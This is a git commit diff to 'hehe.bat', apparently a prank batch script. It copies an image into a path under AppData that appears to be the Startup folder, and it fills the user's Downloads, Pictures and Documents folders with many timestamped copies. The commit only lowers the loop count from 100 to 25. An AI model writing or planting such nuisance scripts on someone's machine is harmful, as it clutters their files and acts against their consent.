1daa283037010f188a2ac3531368458d8c80cd1f
terrortoon <81480921+terrortoon@users.noreply.github.com>
2024-02-19 09:22:43 +0000

    Update hehe.bat

--- hehe.bat
+++ hehe.bat
@@ -5,7 +5,7 @@ Xcopy /I /Y .\hehe.jpg "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\St
 
 set rmcolon=%time::=%
 set rmcomma=%rmcolon:,=%
-FOR /L %%A IN (1,1,100) DO (
+FOR /L %%A IN (1,1,25) DO (
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Downloads\hehe"%%A""%rmcomma%".jpg*
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Pictures\hehe"%%A""%rmcomma%".jpg*
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
